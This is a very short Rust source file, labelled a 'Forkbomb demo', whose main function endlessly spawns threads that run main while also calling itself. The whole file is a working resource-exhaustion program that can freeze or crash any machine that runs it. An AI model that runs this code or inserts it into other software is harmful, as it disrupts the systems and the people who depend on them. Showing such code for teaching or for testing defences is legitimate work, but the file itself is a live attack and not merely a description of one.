//! Forkbomb demo

/// CLI entrypoint
#[allow(unconditional_recursion)]
fn main() {
  std::thread::spawn(main);
  main();
}
